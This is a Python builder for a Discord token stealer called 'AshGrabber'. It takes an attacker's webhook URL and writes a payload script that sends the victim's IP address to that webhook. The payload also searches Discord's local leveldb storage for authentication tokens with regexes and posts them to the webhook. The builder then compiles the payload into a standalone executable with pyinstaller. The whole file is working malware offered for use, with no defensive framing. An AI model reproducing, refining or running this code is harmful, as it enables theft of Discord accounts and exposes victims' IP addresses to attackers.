import os
from colorama import Fore
os.system("cls")

print(Fore.LIGHTMAGENTA_EX + " █████╗ ███████╗██╗  ██╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗  ")
print(Fore.LIGHTMAGENTA_EX + "██╔══██╗██╔════╝██║  ██║    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗")
print(Fore.LIGHTMAGENTA_EX + "███████║███████╗███████║    ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝")
print(Fore.LIGHTMAGENTA_EX + "██╔══██║╚════██║██╔══██║    ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗")
print(Fore.LIGHTMAGENTA_EX + "██║  ██║███████║██║  ██║    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║")
print(Fore.LIGHTMAGENTA_EX + "╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
print(Fore.LIGHTMAGENTA_EX + "---------------------------------------------------------------------------------------")
webhook_url = input(Fore.LIGHTMAGENTA_EX + "Enter Your Webhook URL: ")
os.system("cls")



f = open('build.py', 'w')
f.write('''import os
import re
import requests
import urlopen

webhookUrl = "''')
f.write(webhook_url)
f.write('''"

def ip_grabber():
    ip = requests.get('https://api.ipify.org/').text
    payload = {
        "username": "AshGrabber",
        "avatar_url": "https://cdn.discordapp.com/attachments/960610436741492780/1010563618569457664/servericon2.0.gif"
    }
    payload["embeds"] = [
        {
            "description": ip,
            "title": "IP Address",
            "color": 12696346
        }
    ]
    r = requests.post(webhookUrl, json=payload)
ip_grabber()

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
         'Discord': roaming + '\\Discord',
         'Discord Canary': roaming + '\\discordcanary',
         'Discord PTB': roaming + '\\discordptb'
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message = ""
        
        message += f"{platform}"

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f"{token}\\n"
        else:
            message += "No tokens found.\\n"

        message += ""

        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }
        payload = {
                "content": "@everyone",
                "username": "AshGrabber",
                "avatar_url": "https://cdn.discordapp.com/attachments/960610436741492780/1010563618569457664/servericon2.0.gif"
            }
        payload["embeds"] = [
            {
                "description": message,
                "title": "Discord Token",
                "color": 12696346
            }
        ]
        try:
            r = requests.post(webhookUrl, json=payload, headers=headers)
            urlopen(r)
        except:
            pass

if __name__ == '__main__':
    main()


''')
f.close()
os.system("pyinstaller --onefile build.py")
os.system("cls")

x = input(Fore.GREEN + "Token Logger Has Been Built! ")

